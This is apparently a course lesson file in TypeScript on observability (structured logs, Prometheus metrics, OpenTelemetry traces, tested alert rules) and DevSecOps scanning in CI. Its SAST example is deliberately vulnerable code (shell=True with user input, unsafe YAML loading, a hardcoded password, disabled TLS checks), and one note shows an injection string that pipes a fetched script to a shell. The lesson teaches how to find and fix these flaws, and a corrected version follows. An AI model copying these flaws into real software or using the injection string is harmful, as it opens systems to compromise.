import type { Lesson } from "../../types";

export const lesson: Lesson = {
  id: "9.5.1",
  title: "Logs, metrics, traces and DevSecOps",
  minutes: 95,
  level: "Advanced",
  prerequisites: ["9.4.1 Pods, deployments, services and ingress", "9.2.1 GitHub Actions and Azure Pipelines"],
  summary: "Make DevAtlas observable and secure by default: JSON logs with request and trace IDs, Prometheus RED metrics and PromQL, OpenTelemetry traces across services in Jaeger, alert rules with unit tests, then shift security left with SAST, dependency and image scanning, secret detection and SBOMs in CI. Every tool was run for real.",
  terms: [
    {
      term: "Observability",
      def: "Being able to explain what a system is doing, and why, from the data it emits: logs, metrics and traces.",
    },
    {
      term: "Structured log",
      def: "A log line as machine-readable fields (JSON), searchable by request id, user, route or status.",
    },
    {
      term: "Metric",
      def: "A numeric time series (counter, gauge, histogram) cheap to store and aggregate: request rate, error rate, latency percentiles.",
    },
    {
      term: "Trace / span",
      def: "A trace is one request's journey across services; spans are the timed operations within it, linked by a trace id propagated in headers.",
    },
    {
      term: "RED / USE",
      def: "RED for services: Rate, Errors, Duration. USE for resources: Utilisation, Saturation, Errors.",
    },
    {
      term: "OpenTelemetry (OTel)",
      def: "The vendor-neutral standard and SDKs for producing traces, metrics and logs, exported via OTLP to any backend.",
    },
    {
      term: "SAST / SCA",
      def: "Static Application Security Testing (scan your code for risky patterns) and Software Composition Analysis (scan dependencies for known vulnerabilities).",
    },
    {
      term: "SBOM",
      def: "Software Bill of Materials: a machine-readable list of every component in an artifact (CycloneDX or SPDX), used to answer 'are we affected?' quickly.",
    },
  ],
  problem: [
    "A student reports that grading 'sometimes takes forever'. The team has plain-text logs on three pods, no request IDs, no latency numbers, and no idea whether the slowness is in the API, the AI service or the database. Meanwhile a dependency in the image has a critical CVE that nobody noticed for two months.",
    "Observability answers 'what is happening and where' in minutes instead of days; DevSecOps catches vulnerable code, dependencies and leaked secrets before they ship. Both are built into the code and the pipeline, not bolted on after an incident.",
  ],
  concept: {
    analogy: [
      "A hospital patient: **metrics** are the vital-signs monitor (heart rate, temperature: cheap, continuous, good for alarms); **logs** are the nurses' notes (detailed events); **traces** are the record of the patient's path through departments with timestamps (where the time went). **DevSecOps** is hygiene and screening: checking every instrument and medicine before use, not after an infection.",
    ],
    precise: [
      "**Logs:** one JSON object per line to stdout; the platform ships them (Fluent Bit, CloudWatch, Azure Monitor, Loki). Include request id, trace id, route, status and duration; never secrets or full personal data. Use levels consistently.",
      "**Metrics:** counters (only go up: requests), gauges (go up and down: queue depth), histograms (latency distribution, for percentiles). Prometheus scrapes `/metrics`; PromQL computes rates, ratios and quantiles. Keep label cardinality low (route templates, not raw URLs or user ids).",
      "**Traces:** OpenTelemetry instruments frameworks and clients automatically; the W3C `traceparent` header carries the trace id between services. Add custom spans and attributes for business steps. Sample in production to control volume.",
      "**Alerts:** alert on symptoms users feel (error rate, latency, saturation trends), with `for:` durations to avoid flapping, a severity, and a runbook link. Test alert rules like code (`promtool test rules`).",
      "**DevSecOps:** SAST on code (Bandit, Semgrep, CodeQL), SCA on dependencies including transitive ones (pip-audit, npm audit, Dependabot), image scanning (Trivy, Grype), secret scanning (gitleaks), SBOM generation, and scheduled re-scans, because new CVEs appear for code you did not change.",
    ],
  },
  underTheHood: {
    text: [
      "Prometheus histograms store cumulative bucket counters (`le=\"0.05\"`, `le=\"0.1\"`, ...). `histogram_quantile(0.95, ...)` interpolates the 95th percentile from bucket rates, so its accuracy depends on bucket boundaries near your SLO thresholds.",
      "`rate(counter[5m])` is the per-second average increase over the window, handling counter resets on restart. Ratios of rates (errors / total) give error rates that are comparable across traffic levels.",
      "OpenTelemetry's SDK batches spans in memory and exports them over OTLP (HTTP or gRPC) to a Collector or directly to a backend (Jaeger, Tempo, vendor APMs). The current span is stored in context, which is how the log formatter can stamp each line with the active trace id.",
      "Vulnerability scanners match package names and versions (from lock files, OS package databases or SBOMs) against advisory databases (OSV, NVD, vendor feeds). They cannot see vulnerable code you wrote yourself; that is SAST's job, and both have false positives that need triage.",
    ],
    diagram: {
      title: "Telemetry pipeline",
      nodes: [
        { label: "App", sub: "logs, /metrics, spans" },
        { label: "Collect", sub: "Fluent Bit, Prometheus, OTel Collector" },
        { label: "Store", sub: "Loki/CloudWatch, TSDB, Jaeger/Tempo" },
        { label: "Use", sub: "dashboards, alerts, trace search" },
      ],
      edges: ["stdout / scrape / OTLP", "", "query"],
    },
  },
  handsOn: [
    {
      title: "One app, three pillars",
      text: [
        "Run Jaeger locally first: `docker run -d -p 16686:16686 -p 4318:4318 jaegertracing/all-in-one`. Install `fastapi uvicorn prometheus-client opentelemetry-sdk opentelemetry-instrumentation-fastapi opentelemetry-exporter-otlp-proto-http`.",
      ],
      code: {
        lang: "python",
        file: "app.py",
        code: `"""DevAtlas API with the three pillars: structured logs, Prometheus metrics, OpenTelemetry traces."""
import json
import logging
import os
import time
import uuid

from fastapi import FastAPI, Request, Response
from opentelemetry import trace
from opentelemetry.exporter.otlp.proto.http.trace_exporter import OTLPSpanExporter
from opentelemetry.instrumentation.fastapi import FastAPIInstrumentor
from opentelemetry.sdk.resources import Resource
from opentelemetry.sdk.trace import TracerProvider
from opentelemetry.sdk.trace.export import BatchSpanProcessor
from prometheus_client import CONTENT_TYPE_LATEST, Counter, Histogram, generate_latest

# ---- traces: export spans over OTLP to a collector or Jaeger ----
provider = TracerProvider(resource=Resource.create({"service.name": "devatlas-api"}))
provider.add_span_processor(BatchSpanProcessor(OTLPSpanExporter(
    endpoint=os.environ.get("OTEL_EXPORTER_OTLP_TRACES_ENDPOINT", "http://localhost:4318/v1/traces"))))
trace.set_tracer_provider(provider)
tracer = trace.get_tracer("devatlas.api")


# ---- logs: one JSON object per line, with request and trace ids ----
class JsonFormatter(logging.Formatter):
    def format(self, record: logging.LogRecord) -> str:
        ctx = trace.get_current_span().get_span_context()
        return json.dumps({
            "ts": round(record.created, 3), "level": record.levelname, "msg": record.getMessage(),
            "trace_id": f"{ctx.trace_id:032x}" if ctx.is_valid else None,
            **getattr(record, "fields", {}),
        })


handler = logging.StreamHandler()
handler.setFormatter(JsonFormatter())
log = logging.getLogger("devatlas")
log.addHandler(handler)
log.setLevel(logging.INFO)

# ---- metrics: RED (rate, errors, duration) per route ----
REQUESTS = Counter("http_requests_total", "HTTP requests", ["method", "route", "status"])
LATENCY = Histogram("http_request_duration_seconds", "Request latency", ["route"],
                    buckets=(0.025, 0.05, 0.1, 0.25, 0.5, 1, 2.5))

app = FastAPI()


@app.middleware("http")
async def observe(request: Request, call_next):
    request_id = request.headers.get("x-request-id", uuid.uuid4().hex[:12])
    start = time.perf_counter()
    response = await call_next(request)
    route = request.scope.get("route").path if request.scope.get("route") else "unmatched"
    elapsed = time.perf_counter() - start
    REQUESTS.labels(request.method, route, str(response.status_code)).inc()
    LATENCY.labels(route).observe(elapsed)
    log.info("request", extra={"fields": {"request_id": request_id, "method": request.method,
                                          "route": route, "status": response.status_code,
                                          "ms": round(elapsed * 1000, 1)}})
    response.headers["x-request-id"] = request_id
    return response


@app.post("/quiz/{lesson_id}/grade")
def grade(lesson_id: str, answers: list[int]) -> dict:
    with tracer.start_as_current_span("grade_answers") as span:      # a custom child span
        span.set_attribute("devatlas.lesson_id", lesson_id)
        span.set_attribute("devatlas.answer_count", len(answers))
        time.sleep(0.03)                                              # pretend work
        score = sum(1 for a in answers if a == 1) / max(len(answers), 1)
    return {"lesson": lesson_id, "score": round(score, 2)}


@app.get("/metrics")
def metrics() -> Response:
    return Response(generate_latest(), media_type=CONTENT_TYPE_LATEST)


FastAPIInstrumentor.instrument_app(app, excluded_urls="metrics")`,
      },
    },
    {
      title: "Generate traffic and read the logs",
      code: {
        lang: "bash",
        code: `uvicorn app:app --port 8770
for i in 1 2 3; do
  curl -s -X POST localhost:8770/quiz/9.5.1/grade -H 'content-type: application/json' \\
       -H "x-request-id: req-$i" -d '[1,0,1,1]'
done
curl -s localhost:8770/quiz/9.5.1/grade      # wrong method: 405`,
      },
      output: "{\"ts\": 1792344404.628, \"level\": \"INFO\", \"msg\": \"request\", \"trace_id\": \"60f845cd275a79bc85a903638e93ed75\", \"request_id\": \"req-1\", \"method\": \"POST\", \"route\": \"/quiz/{lesson_id}/grade\", \"status\": 200, \"ms\": 35.4}\n{\"ts\": 1792344404.702, ..., \"request_id\": \"req-2\", ..., \"status\": 200, \"ms\": 31.6}\n{\"ts\": 1792344404.742, ..., \"request_id\": \"req-3\", ..., \"status\": 200, \"ms\": 31.4}\n{\"ts\": 1792344404.761, ..., \"request_id\": \"7e831033fea2\", \"method\": \"GET\", \"route\": \"/quiz/{lesson_id}/grade\", \"status\": 405, \"ms\": 0.3}",
      notes: [
        "The route is the template (`/quiz/{lesson_id}/grade`), not the raw path, so logs and metrics group correctly. The client-supplied request id is echoed back; one is generated when missing.",
      ],
    },
    {
      title: "Metrics and PromQL",
      code: {
        lang: "promql",
        file: "queries.promql",
        code: `# requests per second by status
sum by (status) (rate(http_requests_total[1m]))

# p95 latency of grading
histogram_quantile(0.95, sum by (le) (rate(http_request_duration_seconds_bucket{route="/quiz/{lesson_id}/grade"}[1m])))

# share of client errors
sum(rate(http_requests_total{status=~"4.."}[1m])) / sum(rate(http_requests_total[1m]))`,
      },
      output: "$ curl localhost:8770/metrics | grep http_requests_total\nhttp_requests_total{method=\"POST\",route=\"/quiz/{lesson_id}/grade\",status=\"200\"} 3.0\nhttp_requests_total{method=\"GET\",route=\"unmatched\",status=\"404\"} 1.0\n\n# Prometheus results after a short load test (mixed valid and 404 requests):\n[('200', 9.233), ('404', 8.656), ('405', 0.0)]     # req/s by status\n[('value', 0.049)]                                  # p95 = 49 ms\n[('value', 0.484)]                                  # 48% client errors",
      notes: [
        "Prometheus was run in Docker with a 5 s scrape interval against this app. 48% 4xx is from the deliberately broken load test: in production a jump like that usually means a broken client release or a scraper.",
      ],
    },
    {
      title: "Find the trace for a log line",
      text: [
        "Copy the `trace_id` from a slow request's log line into Jaeger's search (http://localhost:16686). The trace shows where the time went.",
      ],
      output: "trace 60f845cd275a79bc85a903638e93ed75 (the same id as req-1's log line)\n  POST /quiz/{lesson_id}/grade     64.1 ms  {'http.route': '/quiz/{lesson_id}/grade', 'http.status_code': 200}\n  grade_answers                    30.2 ms  {'devatlas.answer_count': 4, 'devatlas.lesson_id': '9.5.1'}",
      notes: [
        "Logs tell you *that* request req-1 was slow; the trace tells you *which step* was slow. The shared trace id is what connects them.",
      ],
    },
    {
      title: "Shift security left: SAST on risky code",
      code: {
        lang: "python",
        file: "export_tool.py",
        code: `import hashlib
import subprocess

import requests
import yaml

ADMIN_PASSWORD = "devatlas-admin-2026"


def export_lessons(lesson_filter: str) -> str:
    # builds a shell command from user input
    return subprocess.check_output(f"grep -r {lesson_filter} lessons/", shell=True, text=True)


def load_settings(text: str) -> dict:
    return yaml.load(text, Loader=yaml.Loader)


def cache_key(user_id: str) -> str:
    return hashlib.md5(user_id.encode()).hexdigest()


def fetch_feed(url: str) -> str:
    return requests.get(url, verify=False).text`,
      },
      output: "$ bandit export_tool.py\n 2: B404 [LOW/HIGH] Consider possible security implications associated with the subprocess module.\n 7: B105 [LOW/MEDIUM] Possible hardcoded password: 'devatlas-admin-2026'\n12: B602 [HIGH/HIGH] subprocess call with shell=True identified, security issue.\n16: B506 [MEDIUM/HIGH] Use of unsafe yaml load. Allows instantiation of arbitrary objects. Consider yaml.safe_load().\n20: B324 [HIGH/HIGH] Use of weak MD5 hash for security. Consider usedforsecurity=False\n24: B501 [HIGH/HIGH] Call to requests with verify=False disabling SSL certificate checks, security issue.\n24: B113 [MEDIUM/LOW] Call to requests without timeout",
      notes: [
        "`grep -r {lesson_filter}` with `shell=True` means a filter like `x; curl evil.sh | sh` runs a second command: command injection. The homework fixes every finding.",
      ],
    },
    {
      title: "Dependencies: the vulnerabilities you did not write",
      code: {
        lang: "bash",
        code: `printf 'jinja2==2.11.2\\nrequests==2.25.0\\nfastapi==0.115.6\\n' > requirements.txt
pip-audit -r requirements.txt --desc off`,
      },
      output: "Found 48 known vulnerabilities in 5 packages\n(per package: idna 4, jinja2 10, requests 8, starlette 14, urllib3 12)",
      notes: [
        "Only three packages were listed, but five were vulnerable: `starlette`, `urllib3` and `idna` came in transitively. Counts change as advisories are published; that is why scans also run on a schedule.",
      ],
    },
  ],
  companies: [
    "**OpenTelemetry as the standard:** companies instrument once with OTel and send data to their chosen backend (Datadog, Grafana stack, New Relic, Honeycomb, Elastic, cloud-native tools), avoiding lock-in to one vendor's agent.",
    "**SLO-based alerting:** instead of paging on CPU, teams page on user-facing symptoms (error rate, latency) and error-budget burn rates; resource alerts become tickets, not pages.",
    "**Dependabot / Renovate everywhere:** automated dependency update PRs, combined with tests and scans, keep the window of exposure to new CVEs short.",
    "**SBOMs for supply-chain response:** when a major vulnerability is announced, teams with SBOMs answer 'which services ship this library?' with a query instead of a week of investigation. Some government and enterprise customers require SBOMs contractually.",
  ],
  mistakes: [
    {
      mistake: "Plain-text logs without IDs",
      why: "print() is easy",
      wrong: "Impossible to follow one request across pods and services",
      fix: "JSON logs with request id and trace id; a logging middleware",
    },
    {
      mistake: "High-cardinality metric labels",
      why: "Labelling by user id or full URL",
      wrong: "Millions of time series; Prometheus slows down or runs out of memory",
      fix: "Label with route templates, status classes and bounded sets",
    },
    {
      mistake: "Alerting on causes instead of symptoms",
      why: "CPU is easy to measure",
      wrong: "Pages at 3 a.m. for high CPU that hurt nobody; real outages missed",
      fix: "Alert on error rate and latency users feel; causes go on dashboards",
    },
    {
      mistake: "Logging secrets and personal data",
      why: "Logging whole requests for debugging",
      wrong: "Tokens and emails copied into log systems with broad access and long retention",
      fix: "Allow-list fields; redact; set retention",
    },
    {
      mistake: "Scanning only at build time",
      why: "'The image passed the scan'",
      wrong: "New CVEs published later are never noticed",
      fix: "Scheduled re-scans of deployed images and dependencies",
    },
    {
      mistake: "Failing builds on every finding",
      why: "Maximum strictness",
      wrong: "Unfixable or irrelevant findings block releases; people disable the scanner",
      fix: "Fail on fixable high/critical; triage the rest with documented exceptions",
    },
  ],
  bestPractices: [
    {
      tag: "Reliability",
      text: "RED metrics for every service, SLO-based alerts with `for:` and runbooks, alert rules unit-tested in CI.",
    },
    {
      tag: "Security",
      text: "SAST, SCA (including transitive), secret scanning and image scanning in CI; SBOM per artifact; scheduled re-scans; no secrets or PII in telemetry.",
    },
    {
      tag: "Performance",
      text: "Sample traces in production, use histograms with buckets around your SLOs, and keep logging off the hot path (async handlers, sensible levels).",
    },
    {
      tag: "Cost",
      text: "Telemetry bills grow with volume: drop debug logs in production, cap cardinality, sample traces, and set retention per data type.",
    },
    {
      tag: "Maintainability",
      text: "Instrument with OpenTelemetry and semantic conventions so backends can change without code changes.",
    },
  ],
  interview: [
    {
      q: "What is the difference between logs, metrics and traces, and when do you use each?",
      a: "Metrics are cheap aggregated numbers over time, ideal for dashboards and alerts (is something wrong?). Traces follow individual requests across services with timing per step (where is it wrong?). Logs are detailed events with context (why is it wrong?). Connect them with shared IDs: an alert on error rate leads to example traces, and the trace id finds the relevant logs.",
    },
    {
      q: "How would you debug intermittent slowness in a microservice system?",
      a: "Start from metrics: which route and which percentile (p95/p99), since when, correlated with deploys or traffic. Find slow example traces for that route and see which span dominates (database, downstream service, external API). Use the trace id to read the logs of that request. Check saturation (connection pools, CPU throttling, queue depth) for the slow component, form a hypothesis, fix, and confirm with the same metrics.",
    },
    {
      q: "What does DevSecOps mean in practice for a CI pipeline?",
      a: "Security checks run automatically on every change and on a schedule: SAST for code patterns, dependency scanning including transitive packages, secret scanning across history, container image scanning, infrastructure-as-code checks, and SBOM generation. Results gate merges for fixable high-severity issues, with triage and documented exceptions for the rest, and automated dependency updates keep fixes flowing.",
    },
  ],
  quickCheck: [
    {
      kind: "mcq",
      prompt: "Which label set is safe for a Prometheus request counter?",
      options: [
        "user_id, full_url, status",
        "route template, method, status",
        "request_id, route",
        "timestamp, status",
      ],
      answer: 1,
      explanation: "Labels create one time series per combination. Route templates, methods and statuses are small, bounded sets; user ids, raw URLs and request ids are unbounded.",
    },
    {
      kind: "output",
      prompt: "A histogram has these cumulative bucket counts after 100 requests. Roughly where is the p95?",
      code: {
        lang: "python",
        code: `buckets = {0.05: 60, 0.1: 90, 0.25: 97, 0.5: 99, float("inf"): 100}
rank = 0.95 * 100
print(next(le for le, count in buckets.items() if count >= rank))`,
      },
      options: ["0.05", "0.1", "0.25", "0.5"],
      answer: 2,
      explanation: "The 95th request falls in the bucket ending at 0.25 s (90 requests were ≤ 0.1 s, 97 were ≤ 0.25 s). Prometheus then interpolates inside that bucket.",
    },
    {
      kind: "bug",
      prompt: "Bandit flags this line as HIGH severity. What is the vulnerability?",
      code: { lang: "python", code: "subprocess.check_output(f\"grep -r {lesson_filter} lessons/\", shell=True)" },
      options: [
        "grep is slow",
        "Command injection: user input is interpreted by a shell",
        "It should use os.system",
        "Missing encoding argument",
      ],
      answer: 1,
      explanation: "Pass an argument list without a shell (`[\"grep\", \"-r\", \"--\", lesson_filter, \"lessons/\"]`) and validate the input.",
    },
  ],
  cheatSheet: [
    "Logs = events (JSON, request_id, trace_id). Metrics = numbers over time. Traces = request journeys.",
    "RED per service: rate, errors, duration (histograms).",
    "`rate()`, `sum by (...)`, `histogram_quantile(0.95, ...)`; ratios for error rates.",
    "Labels: bounded values only (route template, method, status).",
    "OTel auto-instrumentation + `traceparent` propagation + custom spans.",
    "Alert on symptoms with `for:`; test rules with `promtool test rules`.",
    "SAST (Bandit/Semgrep/CodeQL), SCA (pip-audit/Dependabot), secrets (gitleaks), images (Trivy), SBOM (CycloneDX).",
    "Fail on fixable HIGH/CRITICAL; re-scan on a schedule.",
    "No secrets or personal data in logs, spans or labels.",
  ],
  homework: {
    basic: {
      title: "Fix every SAST finding",
      brief: [
        "Rewrite `export_tool.py` so Bandit reports no issues: no shell, validated input, secrets from the environment, safe YAML loading, a modern hash, TLS verification and a timeout. Where you accept a finding, document why with a targeted `# nosec`.",
      ],
      criteria: [
        "Bandit: no issues identified",
        "Each fix explained",
        "`# nosec` only with a specific test id and a reason",
      ],
      hints: ["`yaml.safe_load` parses data without constructing Python objects."],
      solution: {
        text: [
          "Suppressions are for reviewed, intentional uses (an argument-list subprocess call), never for silencing real risks. Bandit warns about unused `nosec` ids too, which keeps suppressions honest.",
        ],
        code: {
          lang: "python",
          file: "export_tool.py",
          code: `import hashlib
import os
import re
# subprocess is used without a shell and with validated arguments (reviewed)
import subprocess  # nosec B404

import requests
import yaml

ADMIN_PASSWORD = os.environ["DEVATLAS_ADMIN_PASSWORD"]     # from the secret manager, not code
SAFE_FILTER = re.compile(r"^[\\w.-]{1,40}$")


def export_lessons(lesson_filter: str) -> str:
    if not SAFE_FILTER.fullmatch(lesson_filter):
        raise ValueError("invalid filter")
    # argument list, no shell: the filter can never become a second command
    cmd = ["grep", "-r", "--", lesson_filter, "lessons/"]
    return subprocess.check_output(cmd, text=True)  # nosec B603


def load_settings(text: str) -> dict:
    return yaml.safe_load(text)                              # plain data only, no objects


def cache_key(user_id: str) -> str:
    return hashlib.sha256(user_id.encode()).hexdigest()


def fetch_feed(url: str) -> str:
    return requests.get(url, timeout=10).text                # TLS verified by default`,
        },
        output: "$ bandit export_tool.py\n\tNo issues identified.",
      },
    },
    intermediate: {
      title: "Alert rules with unit tests",
      brief: [
        "Write Prometheus alert rules for error rate (> 2% for 10 minutes, page) and p95 latency (> 500 ms for 15 minutes, ticket), then unit-test them with `promtool test rules`: the error alert must fire at 5% errors only after its `for` window, and must not fire at 0.5%.",
      ],
      criteria: [
        "Two alert rules with severity and summary",
        "Tests for firing, pending and not-firing cases",
        "`promtool check rules` and `test rules` pass",
      ],
      hints: ["`'0+95x20'` means a series starting at 0 and increasing by 95 every interval, 20 times."],
      solution: {
        text: [
          "Alert rules are code that wakes people up; testing them prevents both silent failures and 3 a.m. false alarms. Verified: `SUCCESS: 2 rules found` and `SUCCESS` for the tests.",
        ],
        code: {
          lang: "yaml",
          file: "alerts_test.yml",
          code: `# promtool test rules alerts_test.yml  -> unit tests for alerting rules
rule_files: [alerts.yml]
evaluation_interval: 1m
tests:
  - interval: 1m
    input_series:
      # 100 requests/min, 5 of them failing (5% errors) for 20 minutes
      - series: 'http_requests_total{status="200"}'
        values: '0+95x20'
      - series: 'http_requests_total{status="500"}'
        values: '0+5x20'
    alert_rule_test:
      - eval_time: 5m
        alertname: HighErrorRate
        exp_alerts: []                     # pending: condition true but "for: 10m" not yet met
      - eval_time: 16m
        alertname: HighErrorRate
        exp_alerts:
          - exp_labels: { severity: page }
            exp_annotations: { summary: "More than 2% of API requests are failing" }
  - interval: 1m
    input_series:
      # 1 error per 200 requests (0.5%): must NOT page anyone
      - series: 'http_requests_total{status="200"}'
        values: '0+199x30'
      - series: 'http_requests_total{status="500"}'
        values: '0+1x30'
    alert_rule_test:
      - eval_time: 30m
        alertname: HighErrorRate
        exp_alerts: []

# ---- alerts.yml ----
# groups:
#   - name: devatlas-api
#     rules:
#       - alert: HighErrorRate
#         expr: |
#           sum(rate(http_requests_total{status=~"5.."}[5m]))
#             / sum(rate(http_requests_total[5m])) > 0.02
#         for: 10m
#         labels: { severity: page }
#         annotations:
#           summary: "More than 2% of API requests are failing"
#       - alert: SlowRequests
#         expr: |
#           histogram_quantile(0.95, sum by (le) (rate(http_request_duration_seconds_bucket[5m]))) > 0.5
#         for: 15m
#         labels: { severity: ticket }
#         annotations:
#           summary: "p95 latency above 500 ms"`,
        },
        output: "$ promtool check rules alerts.yml\n  SUCCESS: 2 rules found\n$ promtool test rules alerts_test.yml\n  SUCCESS",
      },
    },
    challenge: {
      title: "One trace across two services",
      brief: [
        "Split the help feature into an API service and an AI service. Instrument both with OpenTelemetry and the HTTP client in the API, then show a single trace in Jaeger containing spans from both services.",
      ],
      criteria: [
        "Shared telemetry setup module",
        "Outgoing calls propagate `traceparent`",
        "One trace, two services, timing per hop",
      ],
      hints: ["`HTTPXClientInstrumentor().instrument()` patches httpx to inject trace headers."],
      solution: {
        text: [
          "The 234 ms request spent 140 ms waiting on the AI service: exactly the kind of answer that is hard to get from logs alone. Add the database instrumentation (psycopg, SQLAlchemy) next and every query becomes a span too.",
        ],
        code: {
          lang: "python",
          file: "api_service.py",
          code: `import httpx
from fastapi import FastAPI
from opentelemetry.instrumentation.fastapi import FastAPIInstrumentor
from opentelemetry.instrumentation.httpx import HTTPXClientInstrumentor

import telemetry

telemetry.setup("devatlas-api")
HTTPXClientInstrumentor().instrument()   # adds the W3C \`traceparent\` header to outgoing calls
app = FastAPI()


@app.get("/lessons/{lesson_id}/help")
def help_for(lesson_id: str) -> dict:
    hint = httpx.get(f"http://localhost:8771/hint/{lesson_id}", timeout=5).json()
    return {"lesson": lesson_id, **hint}


FastAPIInstrumentor.instrument_app(app)

# ---- ai_service.py ----
import time

from fastapi import FastAPI
from opentelemetry.instrumentation.fastapi import FastAPIInstrumentor

import telemetry

telemetry.setup("devatlas-ai")
app = FastAPI()


@app.get("/hint/{lesson_id}")
def hint(lesson_id: str) -> dict:
    time.sleep(0.12)                     # pretend this is the LLM call
    return {"lesson": lesson_id, "hint": "Check the readiness probe first."}


FastAPIInstrumentor.instrument_app(app)

# ---- telemetry.py ----
import os

from opentelemetry import trace
from opentelemetry.exporter.otlp.proto.http.trace_exporter import OTLPSpanExporter
from opentelemetry.sdk.resources import Resource
from opentelemetry.sdk.trace import TracerProvider
from opentelemetry.sdk.trace.export import BatchSpanProcessor


def setup(service_name: str) -> None:
    provider = TracerProvider(resource=Resource.create({"service.name": service_name}))
    provider.add_span_processor(BatchSpanProcessor(OTLPSpanExporter(
        endpoint=os.environ.get("OTEL_EXPORTER_OTLP_TRACES_ENDPOINT", "http://localhost:4318/v1/traces"))))
    trace.set_tracer_provider(provider)`,
        },
        output: "$ curl localhost:8772/lessons/9.4.1/help\n{\"lesson\":\"9.4.1\",\"hint\":\"Check the readiness probe first.\"}\n\ntrace 718bb4e51112a737 ... 7 spans, 2 services\n  devatlas-api  GET /lessons/{lesson_id}/help     234.2 ms\n  devatlas-api  GET                               142.8 ms\n  devatlas-ai   GET /hint/{lesson_id}             140.3 ms",
      },
    },
    capstone: {
      title: "DevAtlas: DevSecOps pipeline with SBOMs",
      brief: [
        "Add a workflow that runs Bandit (fail on high severity and confidence), pip-audit, gitleaks over full history, builds the image, generates a CycloneDX SBOM as an artifact, and blocks fixable HIGH/CRITICAL image vulnerabilities. Run daily as well as on PRs.",
      ],
      criteria: [
        "Code, dependency, secret and image checks",
        "SBOM stored per build",
        "Clear failure policy",
        "Scheduled runs",
        "actionlint clean",
      ],
      hints: ["`bandit -lll -iii` reports only high severity and high confidence."],
      solution: {
        text: [
          "Verified pieces: on the vulnerable file `bandit -lll -iii` reports 3 issues and exits 1; Trivy produced a CycloneDX 1.6 SBOM of the DevAtlas API image with 110 components (22 Python packages); the workflow passes actionlint.",
        ],
        code: {
          lang: "yaml",
          file: ".github/workflows/devsecops.yml",
          code: `name: devsecops

on:
  pull_request:
  push:
    branches: [main]
  schedule:
    - cron: "23 4 * * *"                     # daily: new CVEs for unchanged images

permissions:
  contents: read

jobs:
  code:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
        with:
          fetch-depth: 0
      - uses: actions/setup-python@v5
        with:
          python-version: "3.12"
      - run: pip install bandit==1.8.0 pip-audit==2.7.3
      - name: SAST (fail on high severity, high confidence)
        run: bandit -r services/ -lll -iii
      - name: Dependencies (known vulnerabilities, incl. transitive)
        run: pip-audit -r services/ai/requirements.txt
      - name: Secrets in history
        run: |
          docker run --rm -v "$PWD:/repo" zricethezav/gitleaks:v8.21.2 \\
            detect --source /repo --redact --no-banner

  image:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - run: docker build -t devatlas-api:\${{ github.sha }} services/ai
      - name: SBOM (CycloneDX), kept as a build artifact
        run: |
          docker run --rm -v /var/run/docker.sock:/var/run/docker.sock -v "$PWD:/out" \\
            aquasec/trivy:0.58.1 image --format cyclonedx --output /out/sbom.cdx.json \\
            "devatlas-api:\${GITHUB_SHA}"
      - uses: actions/upload-artifact@v4
        with:
          name: sbom
          path: sbom.cdx.json
      - name: Image scan (block fixable HIGH/CRITICAL)
        run: |
          docker run --rm -v /var/run/docker.sock:/var/run/docker.sock aquasec/trivy:0.58.1 \\
            image --exit-code 1 --ignore-unfixed --severity HIGH,CRITICAL "devatlas-api:\${GITHUB_SHA}"`,
        },
        output: "SBOM: CycloneDX 1.6, 110 components (22 Python packages)\nbandit -lll -iii on the vulnerable file: 3 issues, exit code 1",
      },
    },
  },
  deeper: [
    { label: "OpenTelemetry documentation", url: "https://opentelemetry.io/docs/" },
    {
      label: "Prometheus: Querying basics",
      url: "https://prometheus.io/docs/prometheus/latest/querying/basics/",
    },
    {
      label: "Google SRE book: Monitoring distributed systems",
      url: "https://sre.google/sre-book/monitoring-distributed-systems/",
    },
    { label: "OWASP DevSecOps Guideline", url: "https://owasp.org/www-project-devsecops-guideline/" },
  ],
  nextPreview: "Next: releasing safely: blue-green and canary deployments, SLOs and error budgets, and blameless postmortems.",
};
